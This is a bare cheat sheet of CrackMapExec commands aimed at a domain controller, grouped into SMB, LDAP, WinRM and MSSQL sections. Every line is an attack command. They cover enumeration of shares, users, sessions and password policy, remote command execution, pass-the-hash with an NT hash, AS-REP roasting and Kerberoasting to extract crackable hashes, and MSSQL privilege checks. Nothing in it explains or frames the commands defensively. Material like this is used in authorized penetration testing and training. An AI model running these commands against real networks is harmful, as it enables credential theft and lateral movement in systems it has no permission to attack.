# SMB Module
crackmapexec smb $DC -u user -p pass --shares
crackmapexec smb $DC -u user -p pass --users
crackmapexec smb $DC -u user -p pass --groups
crackmapexec smb $DC -u user -p pass --pass-pol
crackmapexec smb $DC -u user -p pass --sessions
crackmapexec smb $DC -u user -p pass --loggedon-users
crackmapexec smb $DC -u user -p pass --disks
crackmapexec smb $DC -u user -p pass -M spider_plus
crackmapexec smb $DC -u user -p pass -x whoami

# LDAP Module
crackmapexec ldap $DC -u user -p pass --asreproast output.txt
crackmapexec ldap $DC -u user -p pass --kerberoasting output.txt
crackmapexec ldap $DC -u user -p pass -M adcs
crackmapexec ldap $DC -u user -p pass -M bloodyad

# WinRM Module
crackmapexec winrm $DC -u user -p pass -x whoami
crackmapexec winrm $DC -u user -H NT_HASH -x whoami

# MSSQL Module
crackmapexec mssql $DC -u user -p pass -q "SELECT @@version"
crackmapexec mssql $DC -u user -p pass -M mssql_priv